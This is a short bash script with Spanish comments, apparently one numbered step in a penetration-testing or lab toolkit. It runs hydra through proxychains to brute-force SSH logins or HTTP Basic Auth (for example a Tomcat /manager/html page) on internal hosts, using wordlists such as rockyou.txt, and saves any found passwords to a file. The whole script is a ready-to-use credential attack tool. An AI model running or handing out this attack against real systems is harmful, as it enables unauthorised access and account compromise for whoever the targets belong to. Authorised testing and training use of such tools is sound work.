#!/bin/bash
# 08_bruteforce.sh
# Fuerza bruta de credenciales con hydra a traves de proxychains,
# para servicios SSH o HTTP Basic Auth en hosts internos.
#
# Uso (SSH con un usuario y diccionario):
#   ./08_bruteforce.sh ssh <usuario> <diccionario> <ip_objetivo>
#
# Uso (HTTP Basic Auth con lista combinada user:pass):
#   ./08_bruteforce.sh http <diccionario_combinado> <ip_objetivo> <puerto> <ruta>
#
# Ejemplos:
#   ./08_bruteforce.sh ssh ubuntu ./diccionario.txt 10.0.3.5
#   ./08_bruteforce.sh ssh ubuntu /usr/share/wordlists/rockyou.txt 10.0.5.5
#   ./08_bruteforce.sh http ./tomcat-betterdefaultpasslist.txt 10.0.4.5 8080 /manager/html

set -euo pipefail

MODE="${1:?Uso: $0 <ssh|http> ...}"

case "$MODE" in
  ssh)
    USER="${2:?Falta el usuario}"
    WORDLIST="${3:?Falta el diccionario}"
    TARGET="${4:?Falta la IP objetivo}"

    echo "[*] Fuerza bruta SSH contra ${TARGET} con usuario '${USER}'..."
    proxychains hydra -l "$USER" -P "$WORDLIST" "ssh://${TARGET}"
    ;;

  http)
    WORDLIST="${2:?Falta el diccionario de credenciales combinadas (user:pass)}"
    TARGET="${3:?Falta la IP objetivo}"
    PORT="${4:?Falta el puerto}"
    PATH_URI="${5:?Falta la ruta a atacar, ej: /manager/html}"

    echo "[*] Fuerza bruta HTTP Basic Auth contra ${TARGET}:${PORT}${PATH_URI} ..."
    proxychains hydra -C "$WORDLIST" "$TARGET" -s "$PORT" \
        http-get "$PATH_URI" -t 1 -w 10 -f -o pass_result.txt
    ;;

  *)
    echo "Modo desconocido: $MODE (usa 'ssh' o 'http')"
    exit 1
    ;;
esac
